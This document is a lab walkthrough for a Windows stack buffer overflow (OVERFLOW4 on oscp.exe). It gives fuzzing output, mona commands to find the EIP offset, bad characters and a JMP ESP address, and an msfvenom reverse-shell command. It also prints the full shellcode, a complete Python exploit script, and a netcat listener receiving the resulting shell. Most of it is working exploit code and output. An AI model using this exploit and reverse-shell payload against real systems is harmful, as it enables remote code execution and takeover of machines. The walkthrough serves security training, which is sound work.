# Buffer Overflow (Task 4)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
  * [Repeat Me](#repeat-me)
  * [Gotchas](#gotchas)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.108.0
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /v:$TARGET /workarea
```
```bash
cd exploits
vim fuzzer.py # edit IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.108.0
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[+] Sent: 500 bytes
[+] Sent: 600 bytes
[+] Sent: 700 bytes
[+] Sent: 800 bytes
[+] Sent: 900 bytes
[+] Sent: 1000 bytes
[+] Sent: 1100 bytes
[+] Sent: 1200 bytes
[+] Sent: 1300 bytes
[+] Sent: 1400 bytes
[+] Sent: 1500 bytes
[+] Sent: 1600 bytes
[+] Sent: 1700 bytes
[+] Sent: 1800 bytes
[+] Sent: 1900 bytes
[+] Sent: 2000 bytes
[+] Sent: 2100 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l 2500

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.108.0
[+] Sent exploit.
```

```bash
!mona findmsp -distance 2500

# output
Log data
Address    Message
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 2500
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x0199f242 (length 2500 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x004e394a (length 2500 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x004e4d7a (length 2500 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x70433570 (offset 2026) # <--- LOOK AT THIS
0BADF00D       ESP (0x0199fa30) points at offset 2030 in normal pattern (length 470)
0BADF00D       EBP contains normal pattern : 0x43347043 (offset 2022)
0BADF00D       EBX contains normal pattern : 0x33704332 (offset 2018)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 2500 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x0199f06c to 0x019a03f8 (0x0000138c bytes)
0BADF00D       0x0199f244 : Contains normal cyclic pattern at ESP-0x7ec (-2028) : offset 2, length 2498 (-> 0x0199fc05 : ESP+0x1d6)
0BADF00D   [+] Examining stack (+- 2500 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x0199f06c to 0x019a03f8 (0x0000138c bytes)
0BADF00D       0x0199f168 : Pointer into normal cyclic pattern at ESP-0x8c8 (-2248) : 0x0199f7a0 : offset 1374, length 1126
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:06.396000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: ???, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.108.0
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a ???

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x0197fa30                 Corruption after 168 byte  00 a9 aa cd ce d4 d5       normal                     Stack
```

```bash
# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 0197FA30, "\x00\xa9"
# 01A6FA30, "\x00\xa9\xcd"
# 01A4FA30, "\x00\xa9\xcd\xd4"

vim exploit.py # BADCHARS = "\x00\xa9\xcd\xd4"
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\xa9\xcd\xd4"
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\xa9\xcd\xd4"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <--- USING THIS ONE
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... 
625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... 
62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... 
62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... 
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.265000
```

```bash
# ADDRESS = 625011AF
# RETN = "\xaf\x11\x50\x62"
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
ip address
LHOST=10.8.224.177 # change me
BADCHARS="\x00\xa9\xcd\xd4" # change me
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.224.117 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\xa9\xcd\xd4"

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
PAYLOAD =  b""
PAYLOAD += b"\xbd\x71\x44\xe7\x1a\xdb\xd8\xd9\x74\x24\xf4\x58"
PAYLOAD += b"\x2b\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc\x03\x19"
PAYLOAD += b"\x4a\x05\xef\x25\xba\x4b\x10\xd5\x3b\x2c\x98\x30"
PAYLOAD += b"\x0a\x6c\xfe\x31\x3d\x5c\x74\x17\xb2\x17\xd8\x83"
PAYLOAD += b"\x41\x55\xf5\xa4\xe2\xd0\x23\x8b\xf3\x49\x17\x8a"
PAYLOAD += b"\x77\x90\x44\x6c\x49\x5b\x99\x6d\x8e\x86\x50\x3f"
PAYLOAD += b"\x47\xcc\xc7\xaf\xec\x98\xdb\x44\xbe\x0d\x5c\xb9"
PAYLOAD += b"\x77\x2f\x4d\x6c\x03\x76\x4d\x8f\xc0\x02\xc4\x97"
PAYLOAD += b"\x05\x2e\x9e\x2c\xfd\xc4\x21\xe4\xcf\x25\x8d\xc9"
PAYLOAD += b"\xff\xd7\xcf\x0e\xc7\x07\xba\x66\x3b\xb5\xbd\xbd"
PAYLOAD += b"\x41\x61\x4b\x25\xe1\xe2\xeb\x81\x13\x26\x6d\x42"
PAYLOAD += b"\x1f\x83\xf9\x0c\x3c\x12\x2d\x27\x38\x9f\xd0\xe7"
PAYLOAD += b"\xc8\xdb\xf6\x23\x90\xb8\x97\x72\x7c\x6e\xa7\x64"
PAYLOAD += b"\xdf\xcf\x0d\xef\xf2\x04\x3c\xb2\x9a\xe9\x0d\x4c"
PAYLOAD += b"\x5b\x66\x05\x3f\x69\x29\xbd\xd7\xc1\xa2\x1b\x20"
PAYLOAD += b"\x25\x99\xdc\xbe\xd8\x22\x1d\x97\x1e\x76\x4d\x8f"
PAYLOAD += b"\xb7\xf7\x06\x4f\x37\x22\x88\x1f\x97\x9d\x69\xcf"
PAYLOAD += b"\x57\x4e\x02\x05\x58\xb1\x32\x26\xb2\xda\xd9\xdd"
PAYLOAD += b"\x55\xef\x15\x3d\x14\x87\x27\xbd\x56\xe3\xa1\x5b"
PAYLOAD += b"\x32\x03\xe4\xf4\xab\xba\xad\x8e\x4a\x42\x78\xeb"
PAYLOAD += b"\x4d\xc8\x8f\x0c\x03\x39\xe5\x1e\xf4\xc9\xb0\x7c"
PAYLOAD += b"\x53\xd5\x6e\xe8\x3f\x44\xf5\xe8\x36\x75\xa2\xbf"
PAYLOAD += b"\x1f\x4b\xbb\x55\xb2\xf2\x15\x4b\x4f\x62\x5d\xcf"
PAYLOAD += b"\x94\x57\x60\xce\x59\xe3\x46\xc0\xa7\xec\xc2\xb4"
PAYLOAD += b"\x77\xbb\x9c\x62\x3e\x15\x6f\xdc\xe8\xca\x39\x88"
PAYLOAD += b"\x6d\x21\xfa\xce\x71\x6c\x8c\x2e\xc3\xd9\xc9\x51"
PAYLOAD += b"\xec\x8d\xdd\x2a\x10\x2e\x21\xe1\x90\x4e\xc0\x23"
PAYLOAD += b"\xed\xe6\x5d\xa6\x4c\x6b\x5e\x1d\x92\x92\xdd\x97"
PAYLOAD += b"\x6b\x61\xfd\xd2\x6e\x2d\xb9\x0f\x03\x3e\x2c\x2f"
PAYLOAD += b"\xb0\x3f\x65"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction, PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.108.0
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.108.0] 49249
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

### Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.108.0" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW4 " # change me; vulnerable function of target
OFFSET = 2026 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\xa9\xcd\xd4" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\xbd\x71\x44\xe7\x1a\xdb\xd8\xd9\x74\x24\xf4\x58"
PAYLOAD += b"\x2b\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc\x03\x19"
PAYLOAD += b"\x4a\x05\xef\x25\xba\x4b\x10\xd5\x3b\x2c\x98\x30"
PAYLOAD += b"\x0a\x6c\xfe\x31\x3d\x5c\x74\x17\xb2\x17\xd8\x83"
PAYLOAD += b"\x41\x55\xf5\xa4\xe2\xd0\x23\x8b\xf3\x49\x17\x8a"
PAYLOAD += b"\x77\x90\x44\x6c\x49\x5b\x99\x6d\x8e\x86\x50\x3f"
PAYLOAD += b"\x47\xcc\xc7\xaf\xec\x98\xdb\x44\xbe\x0d\x5c\xb9"
PAYLOAD += b"\x77\x2f\x4d\x6c\x03\x76\x4d\x8f\xc0\x02\xc4\x97"
PAYLOAD += b"\x05\x2e\x9e\x2c\xfd\xc4\x21\xe4\xcf\x25\x8d\xc9"
PAYLOAD += b"\xff\xd7\xcf\x0e\xc7\x07\xba\x66\x3b\xb5\xbd\xbd"
PAYLOAD += b"\x41\x61\x4b\x25\xe1\xe2\xeb\x81\x13\x26\x6d\x42"
PAYLOAD += b"\x1f\x83\xf9\x0c\x3c\x12\x2d\x27\x38\x9f\xd0\xe7"
PAYLOAD += b"\xc8\xdb\xf6\x23\x90\xb8\x97\x72\x7c\x6e\xa7\x64"
PAYLOAD += b"\xdf\xcf\x0d\xef\xf2\x04\x3c\xb2\x9a\xe9\x0d\x4c"
PAYLOAD += b"\x5b\x66\x05\x3f\x69\x29\xbd\xd7\xc1\xa2\x1b\x20"
PAYLOAD += b"\x25\x99\xdc\xbe\xd8\x22\x1d\x97\x1e\x76\x4d\x8f"
PAYLOAD += b"\xb7\xf7\x06\x4f\x37\x22\x88\x1f\x97\x9d\x69\xcf"
PAYLOAD += b"\x57\x4e\x02\x05\x58\xb1\x32\x26\xb2\xda\xd9\xdd"
PAYLOAD += b"\x55\xef\x15\x3d\x14\x87\x27\xbd\x56\xe3\xa1\x5b"
PAYLOAD += b"\x32\x03\xe4\xf4\xab\xba\xad\x8e\x4a\x42\x78\xeb"
PAYLOAD += b"\x4d\xc8\x8f\x0c\x03\x39\xe5\x1e\xf4\xc9\xb0\x7c"
PAYLOAD += b"\x53\xd5\x6e\xe8\x3f\x44\xf5\xe8\x36\x75\xa2\xbf"
PAYLOAD += b"\x1f\x4b\xbb\x55\xb2\xf2\x15\x4b\x4f\x62\x5d\xcf"
PAYLOAD += b"\x94\x57\x60\xce\x59\xe3\x46\xc0\xa7\xec\xc2\xb4"
PAYLOAD += b"\x77\xbb\x9c\x62\x3e\x15\x6f\xdc\xe8\xca\x39\x88"
PAYLOAD += b"\x6d\x21\xfa\xce\x71\x6c\x8c\x2e\xc3\xd9\xc9\x51"
PAYLOAD += b"\xec\x8d\xdd\x2a\x10\x2e\x21\xe1\x90\x4e\xc0\x23"
PAYLOAD += b"\xed\xe6\x5d\xa6\x4c\x6b\x5e\x1d\x92\x92\xdd\x97"
PAYLOAD += b"\x6b\x61\xfd\xd2\x6e\x2d\xb9\x0f\x03\x3e\x2c\x2f"
PAYLOAD += b"\xb0\x3f\x65"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
